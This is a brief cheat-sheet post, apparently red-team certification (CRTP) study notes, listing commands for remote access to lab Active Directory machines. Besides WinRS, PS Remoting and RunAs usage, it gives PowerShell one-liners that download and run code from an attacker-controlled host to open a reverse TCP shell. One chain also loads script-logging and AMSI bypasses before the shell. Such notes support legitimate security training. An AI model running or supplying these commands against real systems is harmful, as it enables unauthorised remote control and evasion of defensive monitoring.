---
title: "Remote Command Execution & Access"
date: 2025-03-27 10:07:00 +0000
categories: [Certifications Technical Notes, Certified Red Team Professional (CRTP)]
tags: [active directory attacks, offensive security]
---

| Method | Command | Description |
| --- | --- | --- |
| **WinRS** | `winrs -r:dcorp-adminsrv cmd` | Execute remote command shell using Windows Remote Shell |
| **PS Remoting** | `Enter-PSSession dcorp-adminsrv` | Start interactive PowerShell session on remote machine |
| **TCP Reverse Shell** | `powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443` | Import and execute TCP reverse shell |
| **WinRS Command Execution** | `winrs -r:dcorp-mgmt cmd /c "set computername && set username"` | Execute specific commands remotely and display environment variables |
| **RunAs (NetOnly)** | `runas /user:dcorp\\srvadmin /netonly cmd` | Spawn command prompt with different user credentials (password prompt) |
| **Bypass Protections + Shell** | `powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"` | Load script logging bypass, AMSI bypass, and TCP shell in sequence |
